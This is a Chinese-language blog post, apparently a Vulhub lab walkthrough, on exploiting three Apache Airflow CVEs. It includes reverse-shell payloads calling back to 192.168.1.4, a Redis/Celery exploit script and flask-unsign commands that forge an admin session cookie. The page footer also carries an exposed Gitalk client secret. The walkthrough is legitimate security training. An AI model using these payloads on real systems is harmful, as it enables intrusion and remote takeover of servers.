@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulhub-3.Airflow | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulhub-3.Airflow</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:21:01</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulhub/">Vulhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Apache-Airflow"><a href="#Apache-Airflow" class="headerlink" title="Apache Airflow"></a>Apache Airflow</h1><p># 初始化数据库</p>
+<p>docker compose run airflow-init#</p>
+<p>开启服务</p>
+<p>Docker-compose up -d</p>
+<p>必须要初始化数据库</p>
+<p>访问ip:8080</p>
+<h2 id="Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）"><a href="#Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）" class="headerlink" title="Apache Airflow 示例dag中的命令注入（CVE-2020-11978）"></a>Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</h2><p>Apache Airflow是 python 语言编写的一个以编程方式创作、安排和监控工作流程的平台。Airflow通过DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具。Airflow除了一个命令行界面，还提供了一个基于 Web 的用户界面可以可视化管道的依赖关系、监控进度、触发任务等。</p>
+<p>Apache Airflow&lt;&#x3D;1.10.10 在 Airflow 附带的一个示例DAG&#x3D; example_trigger_target_dag允许任何经过身份验证的用户以运行Airflow工作程序&#x2F;调度程序的用户身份运行任意命令。</p>
+<p>默认情况下Airflow Web UI是未授权访问的，Airflow Web UI中提供了触发DAG运行的功能，以便测试DAG，而其中example_trigger_controller_dag和example_trigger_target_dag两个DAG组合起来触发命令注入，导致了漏洞产生。</p>
+<p>如果在配置中设置 load_examples&#x3D;False 禁用了示例，就不会受到攻击。</p>
+<p>攻击机监听888端口</p>
+<p><img src="/vulhub-3-airflow//1.png" alt="1"></p>
+<p>安装有airflow的服务器,打开example_trigger_target_dag&#x3D;&#x3D;on</p>
+<p><img src="/vulhub-3-airflow//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulhub/image/3.Airflow/2.png" alt="2"></p>
+<p>进入页面，点击Trigger DAG，进入到调试页面</p>
+<p><img src="/vulhub-3-airflow//3.png" alt="3"></p>
+<p>{“message”:”‘\;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.4&#x2F;888 0&gt;&1;#”}</p>
+<p><img src="/vulhub-3-airflow//4.png" alt="4"></p>
+<p><img src="/vulhub-3-airflow//1.png" alt="1"></p>
+<h2 id="Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）"><a href="#Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）" class="headerlink" title="Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）"></a>Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</h2><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis&#x2F;RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。</p>
+<p><img src="/vulhub-3-airflow//5.png" alt="5"></p>
+<p>先pip install redis 或者用pip install rabbitmq,这里官方给的redis的exp</p>
+<p>import pickle</p>
+<p>import json</p>
+<p>import base64</p>
+<p>import redis</p>
+<p>import sys</p>
+<p>r &#x3D; redis.Redis(host&#x3D;sys.argv[1], port&#x3D;6379, decode_responses&#x3D;True,db&#x3D;0)</p>
+<p>queue_name &#x3D; ‘default’</p>
+<p>ori_str&#x3D;”{\content-encoding\: \utf-8\, \properties\: {\priority\: 0, \delivery_tag\: \f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\, \delivery_mode\: 2, \body_encoding\: \base64\, \correlation_id\: \ed5f75c1-94f7-43e4-ac96-e196ca248bd4\, \delivery_info\: {\routing_key\: \celery\, \exchange\: \\}, \reply_to\: \fb996eec-3033-3c10-9ee1-418e1ca06db8\}, \content-type\: \application&#x2F;json\, \headers\: {\retries\: 0, \lang\: \py\, \argsrepr\: \(100, 200)\, \expires\: null, \task\: \airflow.executors.celery_executor.execute_command\, \kwargsrepr\: \{}\, \root_id\: \ed5f75c1-94f7-43e4-ac96-e196ca248bd4\, \parent_id\: null, \id\: \ed5f75c1-94f7-43e4-ac96-e196ca248bd4\, \origin\: \gen1@132f65270cde\, \eta\: null, \group\: null, \timelimit\: [null, null]}, \body\: \W1sxMDAsIDIwMF0sIHt9LCB7ImNoYWluIjogbnVsbCwgImNob3JkIjogbnVsbCwgImVycmJhY2tzIjogbnVsbCwgImNhbGxiYWNrcyI6IG51bGx9XQ&#x3D;&#x3D;\}”</p>
+<p>task_dict &#x3D; json.loads(ori_str)</p>
+<p>command &#x3D; [‘bash’, ‘-c’, ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.4&#x2F;4444 0&gt;&amp;1’] &#x2F;&#x2F;这这里改变payload</p>
+<p>body&#x3D;[[command], {}, {“chain”: None, “chord”: None, “errbacks”: None, “callbacks”: None}]</p>
+<p>task_dict[‘body’]&#x3D;base64.b64encode(json.dumps(body).encode()).decode()</p>
+<p>print(task_dict)</p>
+<p>r.lpush(queue_name,json.dumps(task_dict))</p>
+<p>我在这里反弹shell了,我的攻击机ip是192.168.1.4,监听端口是4444</p>
+<p><img src="/vulhub-3-airflow//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulhub/image/3.Airflow/6.png" alt="6"></p>
+<p>受害主机是192.168.213.150</p>
+<p>然后cmd运行exp: py exploit_airflow_celery.py 192.168.213.150</p>
+<h2 id="Apache-Airflow-默认密钥导致的权限绕过（CVE-2020-17526）"><a href="#Apache-Airflow-默认密钥导致的权限绕过（CVE-2020-17526）" class="headerlink" title="Apache Airflow 默认密钥导致的权限绕过（CVE-2020-17526）"></a>Apache Airflow 默认密钥导致的权限绕过（CVE-2020-17526）</h2><p>Apache Airflow是一款开源的，分布式任务调度框架。默认情况下，Apache Airflow无需用户认证，但管理员也可以通过指定webserver.authenticate&#x3D;True来开启认证。</p>
+<p>Apache Airflow是python语言编写的一个以编程方式创作、安排和监控工作流程的平台。</p>
+<p>除了几个服务器端 python 脚本之外，它还有一个基于Flask编写的Web应用程序，该Web 应用程序 使用Flask 的无状态签名 cookie 来存储和管理成功的身份验证。在安装过程中，可以使用Airflow命令创建用户，在文档中该用户是具有管理员角色的用户。任何后续用户都可以使用Airflow python 脚本从 Web 界面或命令行创建。</p>
+<p>在其1.10.13版本及以前，即使开启了认证，攻击者也可以通过一个默认密钥来绕过登录，伪造任意用户。</p>
+<p>由于使用默认安全密钥对身份验证信息进行签名，导致安全配置错误。当用户登录时，会设置一个名为session的 cookie ，其中包含 json 格式的用户认证信息。json 中名为user_id的密钥标识了登录的用户。此 json 使用在airflow.cfg配置文件中配置的字符串进行签名。在 1.10.15 和 2.0.2 版本之前，此字符串设置为temporary_key。官方文档和安装消息都没有说明更改此密钥。</p>
+<p>默认密钥为temporary_key造成的问题：</p>
+<p>攻击者可以创建与目标相同版本的本地安装，以管理员身份登录并将会话cookie重播到目标以在远程计算机上以管理员身份登录。</p>
+<p>在这种情况下，可以使用工具来解密和识别明文 json 字符串，然后更新user_id参数并将 cookie 重新发送到服务器以模拟指定了user_id的用户。</p>
+<p>curl -v url：显示url的整个响应过程</p>
+<p>flask-unisign解释：上文提到web程序是基于Flask编写，Flask cookie 是经过签名而不是加密的，因此获得会话 cookie 后，可以尝试暴力破解服务器的密钥。</p>
+<p><img src="/vulhub-3-airflow//7.png" alt="7"></p>
+<p>登录需要账号密码</p>
+<p>准备工作:</p>
+<p>Curl -v 192.168.213.150&#x2F;admin&#x2F;airflow&#x2F;login</p>
+<p><img src="/vulhub-3-airflow//8.png" alt="8"></p>
+<p>获得session</p>
+<p>eyJjc3JmX3Rva2VuIjoiNzJiNWQ4MzEzNzg1YzQ2ZTUzODVjZDRhMmJhZDkxOWI0YTI5MmRmNyJ9.ZpD4Zw.zhBy08WZm_xiBpHWxP_o2ju7n8k</p>
+<p># 安装flask-unsign</p>
+<p>pip install flask-unsign[wordlist]</p>
+<p># 开始爆破</p>
+<p>flask-unsign -u -ceyJjc3JmX3Rva2VuIjoiNzJiNWQ4MzEzNzg1YzQ2ZTUzODVjZDRhMmJhZDkxOWI0YTI5MmRmNyJ9.ZpD4Zw.zhBy08WZm_xiBpHWxP_o2ju7n8k</p>
+<p><img src="/vulhub-3-airflow//9.png" alt="9"></p>
+<p>成功爆破出Key是temporary_key。使用这个key生成一个新的session，如果我们伪造user_id为1：</p>
+<p>flask-unsign -s –secret temporary_key -c “{‘user_id’: ‘1’, ‘_fresh’: False, ‘_permanent’: True}”</p>
+<p><img src="/vulhub-3-airflow//10.png" alt="10"></p>
+<p>拿到我们用key伪造出user_id&#x3D;1的session</p>
+<p>eyJ1c2VyX2lkIjoiMSIsIl9mcmVzaCI6ZmFsc2UsIl9wZXJtYW5lbnQiOnRydWV9.ZpD5nA.ayJ6TnSv1YCQjeA19CbFmVmWAro</p>
+<p>把原来cookie值改一下,刷新一下就进去了</p>
+<p><img src="/vulhub-3-airflow//11.png" alt="11"></p>
+<p>进入后台之后我们用CVE-2020-11978漏洞</p>
+<p>攻击机监听444端口</p>
+<p><img src="/vulhub-3-airflow//12.png" alt="12"></p>
+<p>受害主机用dag中的远程命令执行</p>
+<p>{“message”:”‘\;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.4&#x2F;444 0&gt;&1;#”}</p>
+<p><img src="/vulhub-3-airflow//13.png" alt="13"></p>
+<p>连上了</p>
+<p><img src="/vulhub-3-airflow//14.png" alt="14"></p>
+<p><img src="/vulhub-3-airflow//3.Airflow/15.png" alt="15"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../vulhub-4-aj-report/">Vulhub-4.AJ-Report</a>
+            
+            
+            <a class="next" rel="next" href="../vulhub-2-adminer/">Vulhub-2.Adminer</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
